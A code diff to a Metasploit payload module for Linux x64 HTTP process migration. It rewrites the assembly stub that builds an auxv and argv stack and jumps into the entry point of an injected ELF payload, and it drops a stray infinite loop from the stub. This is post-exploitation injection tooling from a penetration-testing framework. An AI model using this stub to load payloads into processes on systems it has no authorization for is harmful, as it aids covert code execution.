@@ -1,16 +1,17 @@
 # -*- coding: binary -*-
 
 require 'rex/elfparsey'
+
 module Msf
 
 ###
 #
-# Payload that supports migration on x64.
+# Payload that supports HTTP migration on x64.
 #
 ###
 
 module Payload::Linux::X64::MigrateHttp
-  
+
   include Msf::Payload::Linux::X64::Migrate
 
 
@@ -35,36 +36,39 @@ module Payload::Linux::X64::MigrateHttp
   #
   def generate_migrate(opts={})
     entry_offset = elf_ep(opts[:payload])
-    %^
-  _loop:
-      jmp _loop
-      pop r11
-      pop r10
-      pop rsi
-      
-      ; setup stack
-      and rsp, -0x10              ; Align
-      add sp, 80                  ; Add room for initial stack and prog name
-      xor rbx, rbx
-      push rbx                    ; NULL
-      push rbx                    ; AT_NULL
-      push rsi                    ; mmap'd address
-      mov rax, 7                  ; AT_BASE
-      push rax
-      push rbx                    ; end of ENV
-      push rbx                    ; NULL
-      mov rax, 0                  ; ARGC
-      push rax
 
-      ; down the rabbit hole
+    %^
+      pop rax              ; discard pid
+      pop r10              ; discard fd
+      pop rsi              ; rsi = mmap base (payload address)
+
+      and rsp, -0x10       ; align stack
+      add rsp, 128         ; headroom
+
+      ; push prog name "a\0"
+      mov rax, 0x61
+      push rax
+      mov rcx, rsp         ; rcx = ptr to prog name
+
+      xor rbx, rbx
+      push rbx             ; AT_NULL value
+      push rbx             ; AT_NULL type
+      push rsi             ; AT_BASE value (mmap base)
+      mov rax, 7
+      push rax             ; AT_BASE type
+      push rbx             ; NULL (end of envp)
+      push rbx             ; NULL (end of argv)
+      push rcx             ; argv[0] = prog name
+      mov rax, 1
+      push rax             ; argc = 1
+
+      ; Jump to ELF entry point
       mov rax, #{entry_offset}
       add rsi, rax
       jmp rsi
-
     ^
   end
 
 end
 
 end
-
